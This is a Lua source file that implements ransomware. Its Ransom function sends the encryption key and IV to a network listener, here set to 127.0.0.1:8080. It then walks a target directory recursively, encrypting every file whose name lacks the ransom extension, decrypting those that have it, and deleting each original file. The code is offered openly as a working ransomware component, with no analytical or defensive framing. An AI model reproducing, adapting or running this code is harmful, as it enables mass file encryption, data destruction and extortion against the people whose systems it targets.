--[[
    ransomlib:
        bytes_str = hexa_to_bytes
        hexa_str  = bytes_to_hexa
    netlib:
        fd     = connect
        len    = write(fd, string)
        string = read(fd, length)
        close(fd)
    lsf:
        file_iterator = dir(path)
--]]

-- setup ransomlib variables
-- send the keys in the network
-- do ransomware stuff
function Ransom(target, hkey, hiv)
    ransomlib.key  = ransomlib.hexa_to_bytes(hkey)
    ransomlib.iv   = ransomlib.hexa_to_bytes(hiv)
    ransomlib.hkey = ransomlib.bytes_to_hexa(ransomlib.key)
    ransomlib.hiv  = ransomlib.bytes_to_hexa(ransomlib.iv)

    print("target: "..target)
    print("key   : "..ransomlib.hkey)
    print("iv    : "..ransomlib.hiv)
    print("ext   : "..ransomlib.ext)

    SendKey(ransomlib.hkey, ransomlib.hiv)
    Walkdo(target)
end

function SendKey(hkey, hiv)
    local ip, port = "127.0.0.1", 8080
    local conn = netlib.connect(ip, port)
    netlib.write(conn, hkey..":::"..hiv.."\n")
    netlib.close(conn)
end

function Walkdo(path)
    for file in lfs.dir(path) do
        if file ~= "." and file ~= ".." then
            local f = path..'/'..file
            local attr = lfs.attributes (f)
            if attr.mode == "directory" then
                print("[DIR]  "..f)
                Walkdo(f)
            else
                -- if extension match then decrypt otherwise encrypt
                if f:match("[^.]("..ransomlib.ext..")$") then
                    print("[DECRYPT] "..f)
                    ransomlib:decrypt(f)
                    os.remove(f)
                else
                    print("[ENCRYPT] "..f)
                    ransomlib:encrypt(f)
                    os.remove(f)
                end
            end
        end
    end
end

print("[+] Lua code loaded")
